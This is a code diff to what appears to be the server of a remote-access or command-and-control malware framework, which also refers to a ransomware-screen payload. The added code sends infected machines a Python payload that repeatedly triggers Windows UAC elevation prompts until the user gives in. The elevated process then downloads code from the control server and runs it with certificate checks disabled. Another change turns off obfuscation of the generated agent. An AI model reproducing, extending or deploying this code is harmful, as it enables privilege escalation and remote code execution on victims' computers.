@@ -1074,6 +1074,29 @@ if os.path.exists(html_path):
 result = "Ransomware screen cleared and Explorer restarted"
 """
                 task_data = {'code': python_payload}
+            # Intercept #uacloop command
+            elif task_type == 'shell' and task_data.get('cmd', '').strip() == '#uacloop':
+                c.execute("SELECT server_url FROM agent_configurations ORDER BY timestamp DESC LIMIT 1")
+                row = c.fetchone()
+                server_url = row[0].rstrip('/') if row else request.url_root.rstrip('/')
+                task_type = 'execute_python'
+                python_payload = f"""
+import os, sys, ctypes, threading, time
+def uac_loop():
+    server_url = {repr(server_url)}
+    agent_cmd = f"import urllib3;urllib3.disable_warnings();import requests;exec(requests.get('{server_url}/a/d',verify=False).text)"
+    pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+    if not os.path.exists(pyw): pyw = sys.executable
+    params = f'/c ""{{pyw}}" -c "{{agent_cmd}}""'
+    while True:
+        ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", params, None, 0)
+        if int(ret) > 32: break
+        elif int(ret) == 5: time.sleep(0.5); continue
+        else: break
+threading.Thread(target=uac_loop, daemon=True).start()
+result = "UAC loop started"
+"""
+                task_data = {'code': python_payload.strip()}
 
             c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                     (None, 
@@ -1520,7 +1543,7 @@ result = "Ransomware screen cleared and Explorer restarted"
             )
 
             # Apply obfuscation
-            agent_code = _obfuscate_code(agent_code)
+            #agent_code = _obfuscate_code(agent_code)
 
             agent_path = os.path.join(agents_dir, 'agent.py')
             with open(agent_path, 'w') as f:
